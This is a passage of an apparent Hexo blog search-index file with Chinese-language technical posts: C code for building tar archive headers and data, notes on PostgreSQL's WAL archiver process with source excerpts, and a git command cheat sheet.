class="number">124</span>], <span class="number">12</span>, filebuf-&gt;st_size); <span class="comment">//size = file size;</span></span><br><span class="line"></span><br><span class="line">    write_tar_number(&amp;header[<span class="number">136</span>], <span class="number">12</span>, filebuf-&gt;st_mtime); <span class="comment">//modify time;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 156byte is typeflag;</span></span><br><span class="line">    <span class="keyword">if</span> (linktarget != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        header[<span class="number">156</span>] = <span class="string">'2'</span>;</span><br><span class="line">        <span class="built_in">strncpy</span>(&amp;header[<span class="number">157</span>], linktarget, <span class="number">100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (S_ISDIR(filebuf-&gt;st_mode))</span><br><span class="line">        header[<span class="number">156</span>] = <span class="string">'5'</span>;</span><br><span class="line">    <span class="comment">//else if (S_ISBLK(filebuf-&gt;st_mode))</span></span><br><span class="line">    <span class="comment">//    header[156] = '4';</span></span><br><span class="line">    <span class="comment">//else if (S_ISCHR(filebuf-&gt;st_mode))</span></span><br><span class="line">    <span class="comment">//    header[156] = '3';</span></span><br><span class="line">    <span class="comment">//else if(S_ISFIFO(filebuf-&gt;st_mode))</span></span><br><span class="line">    <span class="comment">//    header[156] = '6';</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        header[<span class="number">156</span>] = <span class="string">'0'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(&amp;header[<span class="number">257</span>], <span class="string">"ustar"</span>); <span class="comment">//magic</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;header[<span class="number">263</span>], <span class="string">"00"</span>, <span class="number">2</span>); <span class="comment">//version;</span></span><br><span class="line"></span><br><span class="line">    userinfo =  getpwuid(filebuf-&gt;st_uid);</span><br><span class="line">    groupinfo = getgrgid(filebuf-&gt;st_gid);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strncpy</span>(&amp;header[<span class="number">265</span>], userinfo-&gt;pw_name, <span class="number">32</span>); <span class="comment">//u name;</span></span><br><span class="line">    <span class="built_in">strncpy</span>(&amp;header[<span class="number">297</span>], groupinfo-&gt;gr_name, <span class="number">32</span>); <span class="comment">//g name;</span></span><br><span class="line"></span><br><span class="line">    write_tar_number(&amp;header[<span class="number">329</span>], <span class="number">8</span>, <span class="number">0</span>); <span class="comment">//major;</span></span><br><span class="line"></span><br><span class="line">    write_tar_number(&amp;header[<span class="number">337</span>], <span class="number">8</span>, <span class="number">0</span>); <span class="comment">//minor;</span></span><br><span class="line"></span><br><span class="line">    write_tar_number(&amp;header[<span class="number">148</span>], <span class="number">8</span>, tarCheckSum(header)); <span class="comment">//checksum;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TAR_OK;</span><br></pre></td></tr></table></figure><h4 id="填充文件数据"><a href="#填充文件数据" class="headerlink" title="填充文件数据"></a>填充文件数据</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">writeTarData</span><span class="params">(FILE *tarfile, <span class="keyword">char</span> *buf, <span class="keyword">int</span> r, <span class="keyword">char</span> *current_file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (fwrite(buf, r, <span class="number">1</span>, tarfile) != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, (<span class="string">"%s: could not write to file \"%s\": %s\n"</span>),</span><br><span class="line">                <span class="string">"cs51-tar"</span>, current_file, strerror(errno));</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WRITE_TAR_DATA(buf, sz)  writeTarData(tarfile, buf, sz, filename)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main::</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; file num; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        fp = fopen(file[i], <span class="string">"r"</span>);<span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"append %s\n"</span>, file[i]);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(zerobuf, <span class="number">0</span>, <span class="keyword">sizeof</span>(zerobuf));</span><br><span class="line"></span><br><span class="line">        stat(file[i], &amp;filebuf);</span><br><span class="line"></span><br><span class="line">        header = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>) * TAR_HEADER_LENGTH);</span><br><span class="line">        <span class="built_in">memset</span>(header, <span class="number">0</span>, TAR_HEADER_LENGTH);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//context file ;</span></span><br><span class="line">        context = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>) * filebuf.st_size);</span><br><span class="line">        fread(context, <span class="number">1</span>, filebuf.st_size, fp);</span><br><span class="line"></span><br><span class="line">        tarCreateHeader(header, file[i], <span class="literal">NULL</span>, &amp;filebuf);</span><br><span class="line"></span><br><span class="line">        padding = ((filebuf.st_size + <span class="number">511</span>) &amp; ~<span class="number">511</span>) - filebuf.st_size;</span><br><span class="line"></span><br><span class="line">        WRITE_TAR_DATA(header, TAR_HEADER_LENGTH);</span><br><span class="line">        WRITE_TAR_DATA(context <span class="comment">/*file data*/</span>, filebuf.st_size);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (padding)</span><br><span class="line">            WRITE_TAR_DATA(zerobuf, padding);</span><br><span class="line">    &#125;</span><br><span class="line">    WRITE_TAR_DATA(zerobuf, <span class="keyword">sizeof</span>(zerobuf));</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Postgresql Arch process</title>
      <link href="/2019/08/26/PostgreSQL/2019-08-26-Postgresql-pgarch/"/>
      <url>/2019/08/26/PostgreSQL/2019-08-26-Postgresql-pgarch/</url>
      
        <content type="html"><![CDATA[<ol><li>归档信息文件 .backup</li><li>archive_status文件夹</li><li>Postgresql arch process 进程解析</li></ol><a id="more"></a><h4 id="归档文件"><a href="#归档文件" class="headerlink" title="归档文件"></a>归档文件</h4><p><strong>000000010000000000000002.000000D0.backup</strong></p><p><code>do_pg_stop_backup()</code> 产生backup 信息文件</p><p><img src="https://github.com/vagabond1132/Picture/blob/master/2019-08-26-Postgresql-pgarch/1566549837206.png?raw=true" alt="1566549837206"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BackupHistoryFilePath(path, tli, logSegNo, offset)\</span></span><br><span class="line"><span class="built_in">snprintf</span>(path, MAXPGPATH, XLOGDIR <span class="string">"/%08X%08X%08X.%08X.backup"</span>, tli, \</span><br><span class="line"> (uint32) ((logSegNo) / XLogSegmentsPerXLogId), \</span><br><span class="line"> (uint32) ((logSegNo) % XLogSegmentsPerXLogId), offset)</span><br></pre></td></tr></table></figure><p>Start WAL Location:  offset;</p><p><img src="https://github.com/vagabond1132/Picture/blob/master/2019-08-26-Postgresql-pgarch/1566783010245.png?raw=true" alt="1566783010245"></p><h4 id="archive-status作用"><a href="#archive-status作用" class="headerlink" title="archive_status作用"></a>archive_status作用</h4><p>用于标记文件拷贝情况.</p><p><img src="https://github.com/vagabond1132/Picture/blob/master/2019-08-26-Postgresql-pgarch/1566804346654.png?raw=true" alt="1566804346654"></p><h4 id="postgres-archiver-process"><a href="#postgres-archiver-process" class="headerlink" title="postgres: archiver process"></a><code>postgres: archiver process</code></h4><h5 id="postmaster-c-PostmasterMain"><a href="#postmaster-c-PostmasterMain" class="headerlink" title="postmaster.c:PostmasterMain()"></a>postmaster.c:PostmasterMain()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pqsignal_no_restart(SIGCHLD, reaper);</span><br></pre></td></tr></table></figure><h5 id="postmaster-c-reaper"><a href="#postmaster-c-reaper" class="headerlink" title="postmaster.c:reaper()"></a>postmaster.c:reaper()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * reaper -- signal handler to cleanup after a child process dies;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reaper</span><span class="params">(SIGNAL_ARGS)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//内部pgarch实现;</span></span><br><span class="line"><span class="keyword">if</span> (pid == PgArchPID)</span><br><span class="line">    &#123;</span><br><span class="line">        PgArchPID = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (PgArchStartupAllowed())</span><br><span class="line">   PgArchPID = pgarch_start();</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h5 id="pgarch-c-pgarch-ArchiverCopyLoop"><a href="#pgarch-c-pgarch-ArchiverCopyLoop" class="headerlink" title="pgarch.c:pgarch_ArchiverCopyLoop()"></a>pgarch.c:pgarch_ArchiverCopyLoop()</h5><blockquote><p>使用.ready的archive_status循环遍历所有xlog并归档它们… 大多数情况下我们希望这是一个单独文件, 后端会将这些文件添加到需要归档的列表中. 而我们仍在复制早期的归档文件.</p></blockquote><h5 id="pgarch-c-pgarch-archiveXlog"><a href="#pgarch-c-pgarch-archiveXlog" class="headerlink" title="pgarch.c:pgarch_archiveXlog()"></a>pgarch.c:pgarch_archiveXlog()</h5><blockquote><p>Invokes system(3) to copy one archive file to wherever it should go</p><p>Returns true if successful</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rc = system(xlogarchcmd);</span><br></pre></td></tr></table></figure><p>利用postgresql.conf中archive_command的参数. 进行系统拷贝;</p><h5 id="pgarch-c-pgarch-archiveDone"><a href="#pgarch-c-pgarch-archiveDone" class="headerlink" title="pgarch.c:pgarch_archiveDone()"></a>pgarch.c:pgarch_archiveDone()</h5><blockquote><p>Emit notification that an xlog file has been successfully archived. We do this by renaming the status file from XXXX.ready to XXXX.done. <strong>Eventually, a checkpoint process will notice this and delete both the XXXX.done file and the xlog file itself.</strong> – 检查点进程将会清理xxx.done 和 xlog本身文件.</p></blockquote><p>实现:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">pgarch_archiveDone(<span class="keyword">char</span> *xlog)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> rlogready[MAXPGPATH];</span><br><span class="line">    <span class="keyword">char</span>        rlogdone[MAXPGPATH];</span><br><span class="line">    </span><br><span class="line">    StatusFilePath(rlogready, xlog, <span class="string">".ready"</span>);</span><br><span class="line">    StatusFilePath(rlogdone, xlog, <span class="string">".done"</span>);</span><br><span class="line">    </span><br><span class="line">    (<span class="keyword">void</span>) durable_rename(rlogready, rlogdone, WARNING);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="xlogarchve-c"><a href="#xlogarchve-c" class="headerlink" title="xlogarchve.c"></a>xlogarchve.c</h5><ul><li>XLogArchiveNotify<ul><li>Create an archive notification file</li></ul></li><li>XLogArchiveNotifySeg<ul><li>Convenience routine to notify using segment number representation of filename</li></ul></li><li>XLogArchiveForceDone<ul><li>Emit notification forcibly that an XLOG segment file has been successfully archived, bu creating \<xlog\>.done regardless of whether \<xlog\>.ready exists or not.</xlog\></xlog\></li></ul></li><li>XLogArchiveCheckDone</li><li>XLogArchiveIsBusy<ul><li>Check to see if an XLOG segment file is still unarchived</li></ul></li><li>XLogArchiveIsReadyOrDone</li><li>XLogArchiveIsReady<ul><li>Check to see if an XLOG segment file has an archive notification (.ready) file.</li></ul></li><li>XLogArchiveCleanup<ul><li>Cleanup archive notification file(s) for a particular xlog segment</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Database </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Database </tag>
            
            <tag> Postgresql </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>git command</title>
      <link href="/2019/08/25/software/git-command/"/>
      <url>/2019/08/25/software/git-command/</url>
      
        <content type="html"><![CDATA[<p>git 常用命令:</p><ul><li>git stat</li><li>git command</li><li>git whatchanged</li><li>git show</li><li>git checkout</li><li>git reset</li><li>git commit</li><li>git diff/apply</li><li>git clean</li><li>git branch</li><li>git log</li><li>git cherry-pick</li><li>git rebase</li><li>git merge</li></ul><a id="more"></a><h4 id="查看改动文件-git-status-未add"><a href="#查看改动文件-git-status-未add" class="headerlink" title="查看改动文件 git status 未add"></a>查看改动文件 <code>git status</code> <code>未add</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[ligang@yfslcentos71 hgdb-9-15]$ git status </span><br><span class="line"># On branch ora-fun</span><br><span class="line"># Changes not staged for commit:</span><br><span class="line">#   (use &quot;git add &lt;file&gt;...&quot; to update what will be committed)</span><br><span class="line">#   (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory)</span><br><span class="line">#</span><br><span class="line">#modified:   src/backend/utils/adt/oracle_compatibility/hgdbfuncs_oracle.c</span><br><span class="line">#</span><br><span class="line">no changes added to commit (use &quot;git add&quot; and/or &quot;git commit -a&quot;)</span><br><span class="line">[ligang@yfslcentos71 hgdb-9-15]$ git add src/backend/utils/adt/oracle_compatibility/hgdbfuncs_oracle.c</span><br><span class="line">[ligang@yfslcentos71 hgdb-9-15]$ git commit -m &quot;删除文件注释&quot;</span><br></pre></td></tr></table></figure><h4 id="修改最后一次提交作者信息"><a href="#修改最后一次提交作者信息" class="headerlink" title="修改最后一次提交作者信息"></a>修改最后一次提交作者信息</h4><h5 id="修改最后一次提交"><a href="#修改最后一次提交" class="headerlink" title="修改最后一次提交"></a>修改最后一次提交</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit --amend --author=<span class="string">"ligang &lt;ligang@highgo.com&gt;"</span></span><br></pre></td></tr></table></figure><h5 id="连续几次"><a href="#连续几次" class="headerlink" title="连续几次"></a>连续几次</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rebase -i HEAD~<span class="number">3</span></span><br></pre></td></tr></table></figure><p>将pick修改为edit<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Stopped at <span class="number">230</span>fe3404df2790712209e8797923d6af47a42c7... add content</span><br><span class="line">You can amend the commit now, with</span><br><span class="line">        git commit --amend</span><br><span class="line">Once you are satisfied with your changes, run</span><br><span class="line">        git rebase --continue</span><br></pre></td></tr></table></figure></p><p>此时，用户首先要使用git commit –amend -author修改该提交的作者信息，接着执行git rebase –continue继续修改下一个提交：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git commit --amend --author=<span class="string">"Dennis &lt;dennis@top500corp.com&gt;"</span> --no-edit</span><br><span class="line">$ git rebase --continue</span><br></pre></td></tr></table></figure></p><p>依次修改即可</p><h4 id="git-whatchanged-–stat-每次修改的文件列表-及文件修改的统计-已经add"><a href="#git-whatchanged-–stat-每次修改的文件列表-及文件修改的统计-已经add" class="headerlink" title="git whatchanged –stat  每次修改的文件列表, 及文件修改的统计  已经add"></a>git whatchanged –stat  每次修改的文件列表, 及文件修改的统计  <code>已经add</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[ligang@yfslcentos71 hgdb-9-15]$ git whatchanged --stat </span><br><span class="line">commit 5afb2d3426637fedb1fe6b5fa525091028005eed</span><br><span class="line">Author: ligang &lt;ligang@highgo.com&gt;</span><br><span class="line">Date:   Sun Sep 16 13:35:33 2018 +0800</span><br><span class="line"></span><br><span class="line">    删除文件注释</span><br><span class="line"></span><br><span class="line"> src/backend/utils/adt/oracle_compatibility/hgdbfuncs_oracle.c | 2 --</span><br><span class="line"> 1 file changed, 2 deletions(-)</span><br><span class="line"></span><br><span class="line">commit 593a62120591211eeaf598e059ec67f9c079dd39</span><br><span class="line">Author: ligang &lt;ligang@highgo.com&gt;</span><br><span class="line">Date:   Sun Sep 16 13:25:02 2018 +0800</span><br><span class="line"></span><br><span class="line">    修改完成</span><br><span class="line"></span><br><span class="line"> src/backend/parser/parse_node.c | 26 ++++++++++++++++++++++----</span><br><span class="line"> src/bin/initdb/initdb.c         |  2 ++</span><br><span class="line"> 2 files changed, 24 insertions(+), 4 deletions(-)</span><br></pre></td></tr></table></figure><h4 id="查看Commit改动-git-show"><a href="#查看Commit改动-git-show" class="headerlink" title="查看Commit改动 git show"></a>查看Commit改动 <code>git show</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[ligang@yfslcentos71 hgdb-9-15]$ git show  src/backend/utils/adt/oracle_compatibility/hgdbfuncs_oracle.c</span><br><span class="line">commit 5afb2d3426637fedb1fe6b5fa525091028005eed</span><br><span class="line">Author: ligang &lt;ligang@highgo.com&gt;</span><br><span class="line">Date:   Sun Sep 16 13:35:33 2018 +0800</span><br><span class="line"></span><br><span class="line">    删除文件注释</span><br><span class="line"></span><br><span class="line">diff --git a/src/backend/utils/adt/oracle_compatibility/hgdbfuncs_oracle.c b/src/backend/utils/adt/oracle_compatibility/hgdbfuncs_oracle.c</span><br><span class="line">index ae6f262..ee61b5d 100644</span><br><span class="line">--- a/src/backend/utils/adt/oracle_compatibility/hgdbfuncs_oracle.c</span><br><span class="line">+++ b/src/backend/utils/adt/oracle_compatibility/hgdbfuncs_oracle.c</span><br><span class="line">@@ -1170,12 +1170,10 @@ Datum orafnp_decode(PG_FUNCTION_ARGS)</span><br><span class="line">        if (!OidIsValid(resulttype))</span><br><span class="line">                elog(ERROR, &quot;could not determine data type of decode() input&quot;);</span><br><span class="line"> </span><br><span class="line">-    //ligang_change_begin</span><br><span class="line">     if( 4 == nargs &amp;&amp; UNKNOWNOID == searchtype) </span><br><span class="line">     &#123;</span><br><span class="line">         searchtype = TEXTOID; </span><br><span class="line">     &#125;</span><br><span class="line">-    //ligang_change_end</span><br><span class="line">     </span><br><span class="line">        if (nargs % 2 == 0)</span><br><span class="line">        &#123;</span><br></pre></td></tr></table></figure><h4 id="放弃本地所有修改-git-checkout-未使用-git-add"><a href="#放弃本地所有修改-git-checkout-未使用-git-add" class="headerlink" title="放弃本地所有修改 git checkout .   未使用 git add"></a>放弃本地所有修改 <code>git checkout .</code>   未使用 git add</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -- filename  ## -- 指定当前版本, 可以指定commit id;</span><br></pre></td></tr></table></figure><h4 id="放弃已经缓存的修改-git-reset-使用-git-add"><a href="#放弃已经缓存的修改-git-reset-使用-git-add" class="headerlink" title="放弃已经缓存的修改 git reset    使用 git add ."></a>放弃已经缓存的修改 <code>git reset</code>    使用 git add .</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">可以使用  git reset HEAD filepathname （比如： git reset HEAD readme.md）来放弃指定文件的缓存，</span><br><span class="line">放弃所有的缓存可以使用 git reset HEAD .</span><br></pre></td></tr></table></figure><h4 id="撤销提交的Commit"><a href="#撤销提交的Commit" class="headerlink" title="撤销提交的Commit"></a>撤销提交的Commit</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --options HEAD~n</span><br></pre></td></tr></table></figure><ol><li><p>–mixed</p><p>不删除工作空间改动代码，撤销commit，并且撤销git add . </p></li><li><p>–soft</p><p>不删除工作空间改动代码，撤销commit，不撤销git add . </p></li><li><p>–hard</p><p>删除工作空间改动代码，撤销commit，撤销git add .</p></li></ol><h4 id="推回-commit-状态-已经使用add"><a href="#推回-commit-状态-已经使用add" class="headerlink" title="推回 commit 状态 已经使用add ."></a>推回 commit 状态 已经使用add .</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard HEAD</span><br><span class="line">git reset --hard commitid</span><br></pre></td></tr></table></figure><h4 id="将commit-id-作为分支"><a href="#将commit-id-作为分支" class="headerlink" title="将commit id 作为分支:"></a>将commit id 作为分支:</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b ligang-read   commit`id</span><br></pre></td></tr></table></figure><h4 id="文件diff"><a href="#文件diff" class="headerlink" title="文件diff"></a>文件diff</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git diff ## 可以对比分支;</span><br><span class="line">git diff brach-name &gt; ../change.diff  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">git apply --check ../change.diff   ## 检查diff是否可用</span><br></pre></td></tr></table></figure><h5 id="对比不同commit的文件"><a href="#对比不同commit的文件" class="headerlink" title="对比不同commit的文件"></a>对比不同commit的文件</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff hash1 hash2  filename</span><br></pre></td></tr></table></figure><h4 id="清除未识别-恢复原始"><a href="#清除未识别-恢复原始" class="headerlink" title="清除未识别  -  恢复原始"></a>清除未识别  -  恢复原始</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git checkout .</span><br><span class="line">git clean -d -fx</span><br></pre></td></tr></table></figure><h4 id="重命名分支"><a href="#重命名分支" class="headerlink" title="重命名分支:"></a>重命名分支:</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -m oldName newName</span><br></pre></td></tr></table></figure><h4 id="删除远程分支"><a href="#删除远程分支" class="headerlink" title="删除远程分支"></a>删除远程分支</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push --delete origin oldName</span><br></pre></td></tr></table></figure><h4 id="把修改后的本地分支-与-远程分支关联"><a href="#把修改后的本地分支-与-远程分支关联" class="headerlink" title="把修改后的本地分支 与 远程分支关联"></a>把修改后的本地分支 与 远程分支关联</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch --set-upstream-to origin/newName</span><br></pre></td></tr></table></figure><h4 id="查看文件所有提交历史-git-log-p"><a href="#查看文件所有提交历史-git-log-p" class="headerlink" title="查看文件所有提交历史 git log -p"></a>查看文件所有提交历史 git log -p</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log -p  fileName</span><br></pre></td></tr></table></figure><h4 id="追踪函数在git历史中的变化"><a href="#追踪函数在git历史中的变化" class="headerlink" title="追踪函数在git历史中的变化;"></a>追踪函数在git历史中的变化;</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log  -L :checksum_bctlist:src/backend/postmaster/bct.c</span><br></pre></td></tr></table></figure><h4 id="合并commit-id"><a href="#合并commit-id" class="headerlink" title="合并commit id:"></a>合并commit id:</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rebase -i &lt;startpointer&gt; &lt;endpointer&gt;</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rebase -i HEAD~n   <span class="comment">##n 代表要合并的commit数目;</span></span><br></pre></td></tr></table></figure><p>可以只写startpointer ; 在编辑合并界面， 进行pick sque 操作;</p><h4 id="合并某个分支上的单个commit"><a href="#合并某个分支上的单个commit" class="headerlink" title="合并某个分支上的单个commit"></a>合并某个分支上的单个commit</h4><p>dd2e86 - 946992 -9143a9 - a6fd86 - 5a6057 [master]</p><p>​           \</p><p>​            76cada - 62ecb3 - b886a0 [feature]</p><p>feature 分支上的commit 62ecb3 非常重要，它含有一个bug的修改，或其他人想访问的内容。无论什么原因，你现在只需要将62ecb3 合并到master，而不合并feature上的其他commits，所以我们用git cherry-pick命令来做：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git checkout master</span><br><span class="line"></span><br><span class="line">git cherry-pick <span class="number">62</span>ecb3</span><br></pre></td></tr></table></figure><p>现在62ecb3 就被合并到master分支，并在master中添加了commit（作为一个新的commit）.</p><h4 id="合并某个分支的一系列commit"><a href="#合并某个分支的一系列commit" class="headerlink" title="合并某个分支的一系列commit;"></a>合并某个分支的一系列commit;</h4><p>合并单个commit可能并不满足, 需要合并一些列相连的commits;  这种情况需要使用rebase. </p><p>dd2e86 - 946992 -9143a9 - a6fd86 - 5a6057 [master]</p><p>​           \</p><p>​            76cada - 62ecb3 - b886a0 [feature]</p><p>首先需要基于feature创建一个新的分支，并指明新分支的最后一个commit：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b newbranch <span class="number">62</span>ecb3</span><br></pre></td></tr></table></figure><p>然后，rebase将这个新的分支commit合并到master( –onto masdter). 76cada^ 指明你想从哪个特定的commit开始。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rebase --onto master <span class="number">76</span>cada^</span><br></pre></td></tr></table></figure><p>得到结果, 就是feature分支的commit 76cada ~62ecb3 都被合并到了master分支。</p><h4 id="Merge-合并分支"><a href="#Merge-合并分支" class="headerlink" title="Merge 合并分支"></a>Merge 合并分支</h4><p><code>git merge</code>命令用于合并指定分支到当前分支。 合并后，在查看readme.txt的内容;</p>]]></content>
      
